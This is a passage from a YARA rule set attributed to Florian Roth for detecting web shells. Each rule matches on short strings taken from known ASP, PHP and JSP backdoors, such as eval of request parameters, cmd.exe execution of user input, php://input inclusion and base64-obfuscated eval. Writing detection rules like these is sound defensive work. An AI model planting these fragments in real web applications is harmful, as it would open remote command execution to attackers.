WEBSHELL {\n   meta:\n      description = \"Web Shell - file 01.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:58:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\\\"pass\\\")%>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_asp_404_RID2CE1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:08:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2\" \n   condition: \n      all of them\n}\n\nrule Webshell_webshell_cnseay02_1_RID31D0 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file webshell-cnseay02-1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:38:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_fbi_RID2D7E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file fbi.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo\" \n   condition: \n      all of them\n}\n\nrule Webshell_B374kPHP_B374k_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file B374k.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Http://code.google.com/p/b374k-shell\" fullword\n      $s1 = \"$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'\" \n      $s3 = \"Jayalah Indonesiaku & Lyke @ 2013\" fullword\n      $s4 = \"B374k Vip In Beautify Just For Self\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_cmd_asp_5_1_RID2EA1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd-asp-5.1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:22:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Call oS.Run(\\\"win.com cmd.exe /c \\\"\\\"\\\" & szCMD & \\\" > \\\" & szTF &\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_php_dodo_zip_RID2FA5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zip.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:06:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$hexdtime = '\\\\x' . $dtime[6] . $dtime[7] . '\\\\x' . $dtime[4] . $dtime[5] . '\\\\x\" \n      $s3 = \"$datastr = \\\"\\\\x50\\\\x4b\\\\x03\\\\x04\\\\x0a\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\" \n   condition: \n      all of them\n}\n\nrule Webshell_aZRaiLPhp_v1_0_RID2F86 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file aZRaiLPhp v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:00:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"echo \\\" <font color='#0000FF'>CHMODU \\\".substr(base_convert(@fileperms($\" \n      $s7 = \"echo \\\"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_list_RID2E09 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"// list.php = Directory & File Listing\" fullword\n      $s2 = \"    echo \\\"( ) <a href=?file=\\\" . $fichero . \\\"/\\\" . $filename . \\\">\\\" . $filena\" \n      $s9 = \"// by: The Dark Raver\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_ironshell_RID2E76 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ironshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"print \\\"<form action=\\\\\\\"\\\".$me.\\\"?p=cmd&dir=\\\".realpath('.').\\\"\" \n      $s8 = \"print \\\"<td id=f><a href=\\\\\\\"?p=rename&file=\\\".realpath($file).\\\"&di\" \n   condition: \n      all of them\n}\n\nrule Webshell_caidao_shell_404_RID3075 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St\" \n   condition: \n      all of them\n}\n\nrule Webshell_ASP_aspydrv_RID2EF2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file aspydrv.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:36:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_web_RID2D90 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file web.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:37:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*\\\"%><%@page import=\\\"java.net.*\\\"%><%String t=request.\" \n   condition: \n      all of them\n}\n\nrule Webshell_mysqlwebsh_RID2EF5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mysqlwebsh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \" <TR><TD bgcolor=\\\"<? echo (!$CONNECT && $action == \\\"chparam\\\")?\\\"#660000\\\":\\\"#\" \n   condition: \n      all of them\n}\n\nrule Webshell_jspShell_1_RID2E7B : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file jspShell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:16:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input type=\\\"checkbox\\\" name=\\\"autoUpdate\\\" value=\\\"AutoUpdate\\\" on\" \n      $s1 = \"onblur=\\\"document.shell.autoUpdate.checked= this.oldValue;\" \n   condition: \n      all of them\n}\n\nrule Webshell_Dx_Dx_RID2C7D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Dx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:51:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s9 = \"class=linelisting><nobr>POST (php eval)</td><\" \n   condition: \n      1 of them\n}\n\nrule Webshell_asp_ntdaddy_RID2F31 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ntdaddy.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:46:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"if  FP  =  \\\"RefreshFolder\\\"  or  \" \n      $s10 = \"request.form(\\\"cmdOption\\\")=\\\"DeleteFolder\\\"  \" \n   condition: \n      1 of them\n}\n\nrule Webshell_MySQL_Web_Interface_Version_0_8_RID3634 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file MySQL Web Interface Version 0.8.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\" \n   condition: \n      all of them\n}\n\nrule Webshell_elmaliseker_2_RID2FC5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file elmaliseker.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:11:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td<%if (FSO.GetExtensionName(path & \\\"\\\\\\\" & oFile.Name)=\\\"lnk\\\") or (FSO.GetEx\" \n      $s6 = \"<input type=button value=Save onclick=\\\"EditorCommand('Save')\\\"> <input type=but\" \n   condition: \n      all of them\n}\n\nrule Webshell_ASP_RemExp_RID2E3A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=SubFolder.Name%>\\\"> <a href= \\\"<%=Reques\" \n      $s1 = \"Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_list1_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list1.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"case 's':ConnectionDBM(out,encodeChange(request.getParameter(\\\"drive\" \n      $s9 = \"return \\\"<a href=\\\\\\\"javascript:delFile('\\\"+folderReplace(file)+\\\"')\\\\\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_1_RID2C7A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"!22222222222222222222222222222222222222222222222222\" fullword\n      $s8 = \"<%eval request(\\\"pass\\\")%>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_cmd_win32_RID2DEC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd_win32.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p = Runtime.getRuntime().exec(\\\"cmd.exe /c \\\" + request.getParam\" \n      $s1 = \"<FORM METHOD=\\\"POST\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_phpkit_1_0_odd_RID2FEB : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file odd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"include('php://input');\" fullword\n      $s1 = \"// No eval() calls, no system() calls, nothing normally seen as malicious.\" fullword\n      $s2 = \"ini_set('allow_url_include, 1'); // Allow url inclusion in this script\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_123_RID2CE8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 123.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:09:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<font color=\\\"blue\\\">??????????????????:</font><input type=\\\"text\\\" size=\\\"7\" \n      $s3 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n      $s9 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">    \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_ASP_tool_RID2DA7 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file tool.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:41:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Response.Write \\\"<FORM action=\\\"\\\"\\\" & Request.ServerVariables(\\\"URL\\\") & \\\"\\\"\\\"\" \n      $s3 = \"Response.Write \\\"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\\\" \" \n      $s9 = \"Response.Write \\\"<font face='arial' size='1'><a href=\\\"\\\"#\\\"\\\" onclick=\\\"\\\"javas\" \n   condition: \n      2 of them\n}\n\nrule Webshell_jsp_jshell_RID2ED4 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file jshell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kXpeW[\\\"\" fullword\n      $s4 = \"[7b:g0W@W<\" fullword\n      $s5 = \"b:gHr,g<\" fullword\n      $s8 = \"RhV0W@W<\" fullword\n      $s9 = \"S_MR(u7b\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_ASP_zehir4_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Response.Write \\\"<a href='\\\"&dosyaPath&\\\"?status=7&Path=\\\"&Path&\\\"/\" \n   condition: \n      all of them\n}\n\nrule Webshell_wsb_idc_RID2D81 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file idc.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)\" fullword\n      $s3 = \"{eval($_GET['idc']);}\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_cpg_143_incl_xpl_RID308F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cpg_143_incl_xpl.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$data=\\\"username=\\\".urlencode($USER).\\\"&password=\\\".urlencode($PA\" \n      $s5 = \"fputs($sun_tzu,\\\"<?php echo \\\\\\\"Hi Master!\\\\\\\";ini_set(\\\\\\\"max_execution_time\" \n   condition: \n      1 of them\n}\n\nrule Webshell_mumaasp_com_RID2F38 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mumaasp.com.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:47:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"&9K_)P82ai,A}I92]R\\\"q!C:RZ}S6]=PaTTR\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_404_a_RID2DA5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$pass = md5(md5(md5($pass)));\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_webshell_cnseay_x_RID31B5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file webshell-cnseay-x.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_up_RID2D2E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:20:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Pos = InstrB(BoundaryPos,RequestBin,getByteString(\\\"Content-Dispositio\" \n      $s1 = \"ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_phpkit_0_1a_odd_RID304C : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file odd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"include('php://input');\" fullword\n      $s3 = \"ini_set('allow_url_include, 1'); // Allow url inclusion in this script\" fullword\n      $s4 = \"// uses include('php://input') to execute arbritary code\" fullword\n      $s5 = \"// php://input based backdoor\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_ASP_cmd_2_RID2DAE : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:42:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_PHP_Shell_x3_RID2EEF : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHP Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:35:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"&nbsp;&nbsp;<?php echo buildUrl(\\\"<font color=\\\\\\\"navy\\\\\\\">[\" \n      $s6 = \"echo \\\"</form><form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"post\\\\\\\"><input\" \n      $s9 = \"if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(\" \n   condition: \n      2 of them\n}\n\nrule Webshell_PHP_g00nv13_RID2DFC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file g00nv13.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"case \\\"zip\\\": case \\\"tar\\\": case \\\"rar\\\": case \\\"gz\\\": case \\\"cab\\\": cas\" \n      $s4 = \"if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_h6ss_RID2DD1 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file h6ss.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval(gzuncompress(base64_decode(\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_Ani_Shell_RID2E15 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Ani-Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$Python_CODE = \\\"I\" \n      $s6 = \"$passwordPrompt = \\\"\\\\n=================================================\" \n      $s7 = \"fputs ($sockfd ,\\\"\\\\n===============================================\" \n   condition: \n      1 of them\n}\n\nrule Webshell_jsp_k8cmd_RID2E29 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file k8cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if(request.getSession().getAttribute(\\\"hehe\\\").toString().equals(\\\"hehe\\\"))\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_cmd_1_RID2E16 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      